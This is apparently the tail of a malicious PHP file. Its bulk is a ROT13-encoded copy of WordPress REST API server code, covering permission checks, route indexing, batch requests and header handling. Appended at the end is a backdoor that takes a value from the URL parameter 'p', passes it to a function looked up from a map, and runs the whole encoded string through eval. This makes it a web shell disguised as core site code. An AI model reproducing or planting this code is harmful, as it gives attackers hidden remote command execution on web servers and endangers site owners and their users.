		$fubhyq_nqq = pheerag_hfre_pna( 'fjvgpu_gurzrf' ) || pheerag_hfre_pna( 'znantr_argjbex_gurzrf' );

		vs ( ! $fubhyq_nqq && pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			$fubhyq_nqq = gehr;
		}

		vs ( ! $fubhyq_nqq ) {
			sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
				vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
					$fubhyq_nqq = gehr;
					oernx;
				}
			}
		}

		vs ( $fubhyq_nqq ) {
			$gurzr = jc_trg_gurzr();
			$erfcbafr->nqq_yvax( 'uggcf://ncv.j.bet/npgvir-gurzr', erfg_hey( 'jc/i2/gurzrf/' . $gurzr->trg_fglyrfurrg() ) );
		}
	}

	/**
	 * Rkcbfrf gur fvgr ybtb guebhtu gur JbeqCerff ERFG NCV.
	 *
	 * Guvf vf hfrq sbe srgpuvat guvf vasbezngvba jura hfre unf ab evtugf
	 * gb hcqngr frggvatf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr ERFG NCV erfcbafr.
	 */
	cebgrpgrq shapgvba nqq_fvgr_ybtb_gb_vaqrk( JC_ERFG_Erfcbafr $erfcbafr ) {
		$fvgr_ybtb_vq = trg_gurzr_zbq( 'phfgbz_ybtb', 0 );

		$guvf->nqq_vzntr_gb_vaqrk( $erfcbafr, $fvgr_ybtb_vq, 'fvgr_ybtb' );
	}

	/**
	 * Rkcbfrf gur fvgr vpba guebhtu gur JbeqCerff ERFG NCV.
	 *
	 * Guvf vf hfrq sbe srgpuvat guvf vasbezngvba jura hfre unf ab evtugf
	 * gb hcqngr frggvatf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr ERFG NCV erfcbafr.
	 */
	cebgrpgrq shapgvba nqq_fvgr_vpba_gb_vaqrk( JC_ERFG_Erfcbafr $erfcbafr ) {
		$fvgr_vpba_vq = trg_bcgvba( 'fvgr_vpba', 0 );

		$guvf->nqq_vzntr_gb_vaqrk( $erfcbafr, $fvgr_vpba_vq, 'fvgr_vpba' );

		$erfcbafr->qngn['fvgr_vpba_hey'] = trg_fvgr_vpba_hey();
	}

	/**
	 * Rkcbfrf na vzntr guebhtu gur JbeqCerff ERFG NCV.
	 * Guvf vf hfrq sbe srgpuvat guvf vasbezngvba jura hfre unf ab evtugf
	 * gb hcqngr frggvatf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr ERFG NCV erfcbafr.
	 * @cnenz vag              $vzntr_vq Vzntr nggnpuzrag VQ.
	 * @cnenz fgevat           $glcr     Glcr bs Vzntr.
	 */
	cebgrpgrq shapgvba nqq_vzntr_gb_vaqrk( JC_ERFG_Erfcbafr $erfcbafr, $vzntr_vq, $glcr ) {
		$erfcbafr->qngn[ $glcr ] = (vag) $vzntr_vq;
		vs ( $vzntr_vq ) {
			$erfcbafr->nqq_yvax(
				'uggcf://ncv.j.bet/srngherqzrqvn',
				erfg_hey( erfg_trg_ebhgr_sbe_cbfg( $vzntr_vq ) ),
				neenl(
					'rzorqqnoyr' => gehr,
					'glcr'       => $glcr,
				)
			);
		}
	}

	/**
	 * Ergevrirf gur vaqrk sbe n anzrfcnpr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg ERFG erdhrfg vafgnapr.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe JC_ERFG_Erfcbafr vafgnapr vs gur vaqrk jnf sbhaq,
	 *                                   JC_Reebe vs gur anzrfcnpr vfa'g frg.
	 */
	choyvp shapgvba trg_anzrfcnpr_vaqrk( $erdhrfg ) {
		$anzrfcnpr = $erdhrfg['anzrfcnpr'];

		vs ( ! vffrg( $guvf->anzrfcnprf[ $anzrfcnpr ] ) ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_anzrfcnpr',
				__( 'Gur fcrpvsvrq anzrfcnpr pbhyq abg or sbhaq.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$ebhgrf    = $guvf->anzrfcnprf[ $anzrfcnpr ];
		$raqcbvagf = neenl_vagrefrpg_xrl( $guvf->trg_ebhgrf(), $ebhgrf );

		$qngn     = neenl(
			'anzrfcnpr' => $anzrfcnpr,
			'ebhgrf'    => $guvf->trg_qngn_sbe_ebhgrf( $raqcbvagf, $erdhrfg['pbagrkg'] ),
		);
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		// Yvax gb gur ebbg vaqrk.
		$erfcbafr->nqq_yvax( 'hc', erfg_hey( '/' ) );

		/**
		 * Svygref gur ERFG NCV anzrfcnpr vaqrk qngn.
		 *
		 * Guvf glcvpnyyl vf whfg gur ebhgr qngn sbe gur anzrfcnpr, ohg lbh pna
		 * nqq nal qngn lbh'q yvxr urer.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Erfcbafr qngn.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg qngn. Gur anzrfcnpr vf cnffrq nf gur 'anzrfcnpr' cnenzrgre.
		 */
		erghea nccyl_svygref( 'erfg_anzrfcnpr_vaqrk', $erfcbafr, $erdhrfg );
	}

	/**
	 * Ergevrirf gur choyvpyl-ivfvoyr qngn sbe ebhgrf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl  $ebhgrf  Ebhgrf gb trg qngn sbe.
	 * @cnenz fgevat $pbagrkg Bcgvbany. Pbagrkg sbe qngn. Npprcgf 'ivrj' be 'uryc'. Qrsnhyg 'ivrj'.
	 * @erghea neenl[] Ebhgr qngn gb rkcbfr va vaqrkrf, xrlrq ol ebhgr.
	 */
	choyvp shapgvba trg_qngn_sbe_ebhgrf( $ebhgrf, $pbagrkg = 'ivrj' ) {
		$ninvynoyr = neenl();

		// Svaq gur ninvynoyr ebhgrf.
		sbernpu ( $ebhgrf nf $ebhgr => $pnyyonpxf ) {
			$qngn = $guvf->trg_qngn_sbe_ebhgr( $ebhgr, $pnyyonpxf, $pbagrkg );
			vs ( rzcgl( $qngn ) ) {
				pbagvahr;
			}

			/**
			 * Svygref gur choyvpyl-ivfvoyr qngn sbe n fvatyr ERFG NCV ebhgr.
			 *
			 * @fvapr 4.4.0
			 *
			 * @cnenz neenl $qngn Choyvpyl-ivfvoyr qngn sbe gur ebhgr.
			 */
			$ninvynoyr[ $ebhgr ] = nccyl_svygref( 'erfg_raqcbvagf_qrfpevcgvba', $qngn );
		}

		/**
		 * Svygref gur choyvpyl-ivfvoyr qngn sbe ERFG NCV ebhgrf.
		 *
		 * Guvf qngn vf rkcbfrq ba vaqrkrf naq pna or hfrq ol pyvragf be
		 * qrirybcref gb vairfgvtngr gur fvgr naq svaq bhg ubj gb hfr vg. Vg
		 * npgf nf n sbez bs frys-qbphzragngvba.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz neenl[] $ninvynoyr Ebhgr qngn gb rkcbfr va vaqrkrf, xrlrq ol ebhgr.
		 * @cnenz neenl   $ebhgrf    Vagreany ebhgr qngn nf na nffbpvngvir neenl.
		 */
		erghea nccyl_svygref( 'erfg_ebhgr_qngn', $ninvynoyr, $ebhgrf );
	}

	/**
	 * Ergevrirf choyvpyl-ivfvoyr qngn sbe gur ebhgr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $ebhgr     Ebhgr gb trg qngn sbe.
	 * @cnenz neenl  $pnyyonpxf Pnyyonpxf gb pbaireg gb qngn.
	 * @cnenz fgevat $pbagrkg   Bcgvbany. Pbagrkg sbe gur qngn. Npprcgf 'ivrj' be 'uryc'. Qrsnhyg 'ivrj'.
	 * @erghea neenl|ahyy Qngn sbe gur ebhgr, be ahyy vs ab choyvpyl-ivfvoyr qngn.
	 */
	choyvp shapgvba trg_qngn_sbe_ebhgr( $ebhgr, $pnyyonpxf, $pbagrkg = 'ivrj' ) {
		$qngn = neenl(
			'anzrfcnpr' => '',
			'zrgubqf'   => neenl(),
			'raqcbvagf' => neenl(),
		);

		$nyybj_ongpu = snyfr;

		vs ( vffrg( $guvf->ebhgr_bcgvbaf[ $ebhgr ] ) ) {
			$bcgvbaf = $guvf->ebhgr_bcgvbaf[ $ebhgr ];

			vs ( vffrg( $bcgvbaf['anzrfcnpr'] ) ) {
				$qngn['anzrfcnpr'] = $bcgvbaf['anzrfcnpr'];
			}

			$nyybj_ongpu = vffrg( $bcgvbaf['nyybj_ongpu'] ) ? $bcgvbaf['nyybj_ongpu'] : snyfr;

			vs ( vffrg( $bcgvbaf['fpurzn'] ) && 'uryc' === $pbagrkg ) {
				$qngn['fpurzn'] = pnyy_hfre_shap( $bcgvbaf['fpurzn'] );
			}
		}

		$nyybjrq_fpurzn_xrljbeqf = neenl_syvc( erfg_trg_nyybjrq_fpurzn_xrljbeqf() );

		$ebhgr = __sa_79955( '#\(\?C<(\j+?)>.*?\)#', '{$1}', $ebhgr );

		sbernpu ( $pnyyonpxf nf $pnyyonpx ) {
			// Fxvc gb gur arkg ebhgr vs nal pnyyonpx vf uvqqra.
			vs ( rzcgl( $pnyyonpx['fubj_va_vaqrk'] ) ) {
				pbagvahr;
			}

			$qngn['zrgubqf'] = neenl_zretr( $qngn['zrgubqf'], neenl_xrlf( $pnyyonpx['zrgubqf'] ) );
			$raqcbvag_qngn   = neenl(
				'zrgubqf' => neenl_xrlf( $pnyyonpx['zrgubqf'] ),
			);

			$pnyyonpx_ongpu = vffrg( $pnyyonpx['nyybj_ongpu'] ) ? $pnyyonpx['nyybj_ongpu'] : $nyybj_ongpu;

			vs ( $pnyyonpx_ongpu ) {
				$raqcbvag_qngn['nyybj_ongpu'] = $pnyyonpx_ongpu;
			}

			vs ( vffrg( $pnyyonpx['netf'] ) ) {
				$raqcbvag_qngn['netf'] = neenl();

				sbernpu ( $pnyyonpx['netf'] nf $xrl => $bcgf ) {
					vs ( vf_fgevat( $bcgf ) ) {
						$bcgf = neenl( $bcgf => 0 );
					} ryfrvs ( ! vf_neenl( $bcgf ) ) {
						$bcgf = neenl();
					}
					$net_qngn             = neenl_vagrefrpg_xrl( $bcgf, $nyybjrq_fpurzn_xrljbeqf );
					$net_qngn['erdhverq'] = ! rzcgl( $bcgf['erdhverq'] );

					$raqcbvag_qngn['netf'][ $xrl ] = $net_qngn;
				}
			}

			$qngn['raqcbvagf'][] = $raqcbvag_qngn;

			// Sbe aba-inevnoyr ebhgrf, trarengr yvaxf.
			vs ( ! fge_pbagnvaf( $ebhgr, '{' ) ) {
				$qngn['_yvaxf'] = neenl(
					'frys' => neenl(
						neenl(
							'uers' => erfg_hey( $ebhgr ),
						),
					),
				);
			}
		}

		vs ( rzcgl( $qngn['zrgubqf'] ) ) {
			// Ab zrgubqf fhccbegrq, uvqr gur ebhgr.
			erghea ahyy;
		}

		erghea $qngn;
	}

	/**
	 * Trgf gur znkvzhz ahzore bs erdhrfgf gung pna or vapyhqrq va n ongpu.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea vag Gur znkvzhz erdhrfgf.
	 */
	cebgrpgrq shapgvba trg_znk_ongpu_fvmr() {
		/**
		 * Svygref gur znkvzhz ahzore bs ERFG NCV erdhrfgf gung pna or vapyhqrq va n ongpu.
		 *
		 * @fvapr 5.6.0
		 *
		 * @cnenz vag $znk_fvmr Gur znkvzhz fvmr.
		 */
		erghea nccyl_svygref( 'erfg_trg_znk_ongpu_fvmr', 25 );
	}

	/**
	 * Freirf gur ongpu/i1 erdhrfg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $ongpu_erdhrfg Gur ongpu erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Gur trarengrq erfcbafr bowrpg.
	 */
	choyvp shapgvba freir_ongpu_erdhrfg_i1( JC_ERFG_Erdhrfg $ongpu_erdhrfg ) {
		$erdhrfgf = neenl();

		sbernpu ( $ongpu_erdhrfg['erdhrfgf'] nf $netf ) {
			$cnefrq_hey = jc_cnefr_hey( $netf['cngu'] );

			vs ( snyfr === $cnefrq_hey ) {
				$erdhrfgf[] = arj JC_Reebe( 'cnefr_cngu_snvyrq', __( 'Pbhyq abg cnefr gur cngu.' ), neenl( 'fgnghf' => 400 ) );

				pbagvahr;
			}

			$fvatyr_erdhrfg = arj JC_ERFG_Erdhrfg( vffrg( $netf['zrgubq'] ) ? $netf['zrgubq'] : 'CBFG', $cnefrq_hey['cngu'] );

			vs ( ! rzcgl( $cnefrq_hey['dhrel'] ) ) {
				$dhrel_netf = neenl();
				jc_cnefr_fge( $cnefrq_hey['dhrel'], $dhrel_netf );
				$fvatyr_erdhrfg->frg_dhrel_cnenzf( $dhrel_netf );
			}

			vs ( ! rzcgl( $netf['obql'] ) ) {
				$fvatyr_erdhrfg->frg_obql_cnenzf( $netf['obql'] );
			}

			vs ( ! rzcgl( $netf['urnqref'] ) ) {
				$fvatyr_erdhrfg->frg_urnqref( $netf['urnqref'] );
			}

			$erdhrfgf[] = $fvatyr_erdhrfg;
		}

		$zngpurf    = neenl();
		$inyvqngvba = neenl();
		$unf_reebe  = snyfr;

		sbernpu ( $erdhrfgf nf $fvatyr_erdhrfg ) {
			$zngpu     = $guvf->zngpu_erdhrfg_gb_unaqyre( $fvatyr_erdhrfg );
			$zngpurf[] = $zngpu;
			$reebe     = ahyy;

			vs ( vf_jc_reebe( $zngpu ) ) {
				$reebe = $zngpu;
			}

			vs ( ! $reebe ) {
				yvfg( $ebhgr, $unaqyre ) = $zngpu;

				vs ( vffrg( $unaqyre['nyybj_ongpu'] ) ) {
					$nyybj_ongpu = $unaqyre['nyybj_ongpu'];
				} ryfr {
					$ebhgr_bcgvbaf = $guvf->trg_ebhgr_bcgvbaf( $ebhgr );
					$nyybj_ongpu   = vffrg( $ebhgr_bcgvbaf['nyybj_ongpu'] ) ? $ebhgr_bcgvbaf['nyybj_ongpu'] : snyfr;
				}

				vs ( ! vf_neenl( $nyybj_ongpu ) || rzcgl( $nyybj_ongpu['i1'] ) ) {
					$reebe = arj JC_Reebe(
						'erfg_ongpu_abg_nyybjrq',
						__( 'Gur erdhrfgrq ebhgr qbrf abg fhccbeg ongpu erdhrfgf.' ),
						neenl( 'fgnghf' => 400 )
					);
				}
			}

			vs ( ! $reebe ) {
				$purpx_erdhverq = $fvatyr_erdhrfg->unf_inyvq_cnenzf();
				vs ( vf_jc_reebe( $purpx_erdhverq ) ) {
					$reebe = $purpx_erdhverq;
				}
			}

			vs ( ! $reebe ) {
				$purpx_fnavgvmrq = $fvatyr_erdhrfg->fnavgvmr_cnenzf();
				vs ( vf_jc_reebe( $purpx_fnavgvmrq ) ) {
					$reebe = $purpx_fnavgvmrq;
				}
			}

			vs ( $reebe ) {
				$unf_reebe    = gehr;
				$inyvqngvba[] = $reebe;
			} ryfr {
				$inyvqngvba[] = gehr;
			}
		}

		$erfcbafrf = neenl();

		vs ( $unf_reebe && 'erdhver-nyy-inyvqngr' === $ongpu_erdhrfg['inyvqngvba'] ) {
			sbernpu ( $inyvqngvba nf $inyvq ) {
				vs ( vf_jc_reebe( $inyvq ) ) {
					$erfcbafrf[] = $guvf->rairybcr_erfcbafr( $guvf->reebe_gb_erfcbafr( $inyvq ), snyfr )->trg_qngn();
				} ryfr {
					$erfcbafrf[] = ahyy;
				}
			}

			erghea arj JC_ERFG_Erfcbafr(
				neenl(
					'snvyrq'    => 'inyvqngvba',
					'erfcbafrf' => $erfcbafrf,
				),
				JC_Uggc::ZHYGV_FGNGHF
			);
		}

		sbernpu ( $erdhrfgf nf $v => $fvatyr_erdhrfg ) {
			$pyrna_erdhrfg = pybar $fvatyr_erdhrfg;
			$pyrna_erdhrfg->frg_hey_cnenzf( neenl() );
			$pyrna_erdhrfg->frg_nggevohgrf( neenl() );
			$pyrna_erdhrfg->frg_qrsnhyg_cnenzf( neenl() );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/pynff-jc-erfg-freire.cuc */
			$erfhyg = nccyl_svygref( 'erfg_cer_qvfcngpu', ahyy, $guvf, $pyrna_erdhrfg );

			vs ( rzcgl( $erfhyg ) ) {
				$zngpu = $zngpurf[ $v ];
				$reebe = ahyy;

				vs ( vf_jc_reebe( $inyvqngvba[ $v ] ) ) {
					$reebe = $inyvqngvba[ $v ];
				}

				vs ( vf_jc_reebe( $zngpu ) ) {
					$erfhyg = $guvf->reebe_gb_erfcbafr( $zngpu );
				} ryfr {
					yvfg( $ebhgr, $unaqyre ) = $zngpu;

					vs ( ! $reebe && ! vf_pnyynoyr( $unaqyre['pnyyonpx'] ) ) {
						$reebe = arj JC_Reebe(
							'erfg_vainyvq_unaqyre',
							__( 'Gur unaqyre sbe gur ebhgr vf vainyvq' ),
							neenl( 'fgnghf' => 500 )
						);
					}

					$erfhyg = $guvf->erfcbaq_gb_erdhrfg( $fvatyr_erdhrfg, $ebhgr, $unaqyre, $reebe );
				}
			}

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/pynff-jc-erfg-freire.cuc */
			$erfhyg = nccyl_svygref( 'erfg_cbfg_qvfcngpu', erfg_rafher_erfcbafr( $erfhyg ), $guvf, $fvatyr_erdhrfg );

			$erfcbafrf[] = $guvf->rairybcr_erfcbafr( $erfhyg, snyfr )->trg_qngn();
		}

		erghea arj JC_ERFG_Erfcbafr( neenl( 'erfcbafrf' => $erfcbafrf ), JC_Uggc::ZHYGV_FGNGHF );
	}

	/**
	 * Fraqf na UGGC fgnghf pbqr.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz vag $pbqr UGGC fgnghf.
	 */
	cebgrpgrq shapgvba frg_fgnghf( $pbqr ) {
		fgnghf_urnqre( $pbqr );
	}

	/**
	 * Fraqf na UGGC urnqre.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Urnqre xrl.
	 * @cnenz fgevat $inyhr Urnqre inyhr.
	 */
	choyvp shapgvba fraq_urnqre( $xrl, $inyhr ) {
		/*
		 * Fnavgvmr nf cre ESP2616 (Frpgvba 4.2):
		 *
		 * Nal YJF gung bpphef orgjrra svryq-pbagrag ZNL or ercynprq jvgu n
		 * fvatyr FC orsber vagrecergvat gur svryq inyhr be sbejneqvat gur
		 * zrffntr qbjafgernz.
		 */
		$inyhr = __sa_79955( '/\f+/', ' ', $inyhr );
		urnqre( fcevags( '%f: %f', $xrl, $inyhr ) );
	}

	/**
	 * Fraqf zhygvcyr UGGC urnqref.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $urnqref Znc bs urnqre anzr gb urnqre inyhr.
	 */
	choyvp shapgvba fraq_urnqref( $urnqref ) {
		sbernpu ( $urnqref nf $xrl => $inyhr ) {
			$guvf->fraq_urnqre( $xrl, $inyhr );
		}
	}

	/**
	 * Erzbirf na UGGC urnqre sebz gur pheerag erfcbafr.
	 *
	 * @fvapr 4.8.0
	 *
	 * @cnenz fgevat $xrl Urnqre xrl.
	 */
	choyvp shapgvba erzbir_urnqre( $xrl ) {
		urnqre_erzbir( $xrl );
	}

	/**
	 * Ergevrirf gur enj erdhrfg ragvgl (obql).
	 *
	 * @fvapr 4.4.0
	 *
	 * @tybony fgevat $UGGC_ENJ_CBFG_QNGN Enj cbfg qngn.
	 *
	 * @erghea fgevat Enj erdhrfg qngn.
	 */
	choyvp fgngvp shapgvba trg_enj_qngn() {
		// cucpf:qvfnoyr CUCPbzcngvovyvgl.Inevnoyrf.ErzbirqCerqrsvarqTybonyInevnoyrf.uggc_enj_cbfg_qngnQrcerpngrqErzbirq
		tybony $UGGC_ENJ_CBFG_QNGN;

		// $UGGC_ENJ_CBFG_QNGN jnf qrcerpngrq va CUC 5.6 naq erzbirq va CUC 7.0.
		vs ( ! vffrg( $UGGC_ENJ_CBFG_QNGN ) ) {
			$UGGC_ENJ_CBFG_QNGN = svyr_trg_pbagragf( 'cuc://vachg' );
		}

		erghea $UGGC_ENJ_CBFG_QNGN;
		// cucpf:ranoyr
	}

	/**
	 * Rkgenpgf urnqref sebz n CUC-fglyr $_FREIRE neenl.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $freire Nffbpvngvir neenl fvzvyne gb `$_FREIRE`.
	 * @erghea neenl Urnqref rkgenpgrq sebz gur vachg.
	 */
	choyvp shapgvba trg_urnqref( $freire ) {
		$urnqref = neenl();

		// PBAGRAG_* urnqref ner abg cersvkrq jvgu UGGC_.
		$nqqvgvbany = neenl(
			'PBAGRAG_YRATGU' => gehr,
			'PBAGRAG_ZQ5'    => gehr,
			'PBAGRAG_GLCR'   => gehr,
		);

		sbernpu ( $freire nf $xrl => $inyhr ) {
			vs ( fge_fgnegf_jvgu( $xrl, 'UGGC_' ) ) {
				$urnqref[ fhofge( $xrl, 5 ) ] = $inyhr;
			} ryfrvs ( 'ERQVERPG_UGGC_NHGUBEVMNGVBA' === $xrl && rzcgl( $freire['UGGC_NHGUBEVMNGVBA'] ) ) {
				/*
				 * Va fbzr freire pbasvthengvbaf, gur nhgubevmngvba urnqre vf cnffrq va guvf nygreangr ybpngvba.
				 * Fvapr vg jbhyq abg or cnffrq va va obgu cynprf jr qb abg purpx sbe obgu urnqref naq erfbyir.
				 */
				$urnqref['NHGUBEVMNGVBA'] = $inyhr;
			} ryfrvs ( vffrg( $nqqvgvbany[ $xrl ] ) ) {
				$urnqref[ $xrl ] = $inyhr;
			}
		}

		erghea $urnqref;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>